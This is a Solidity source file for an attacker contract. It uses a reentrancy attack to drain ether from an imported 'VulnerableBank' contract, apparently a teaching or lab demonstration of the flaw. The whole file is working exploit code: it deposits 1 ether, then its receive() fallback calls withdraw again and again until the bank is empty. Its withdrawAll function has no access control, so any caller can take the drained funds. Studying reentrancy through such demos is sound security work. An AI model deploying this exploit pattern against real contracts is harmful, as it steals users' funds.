// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract AttackerContract {
    VulnerableBank public bank;
    address private hacker;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    // Fallback function to enable reentrancy
    receive() external payable {
        if (address(bank).balance >= ATTACK_AMOUNT) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(
            msg.value == ATTACK_AMOUNT,
            "Please send exactly 1 ether to start the attack"
        );
        bank.deposit{value: ATTACK_AMOUNT}();
        bank.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdrawAll() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
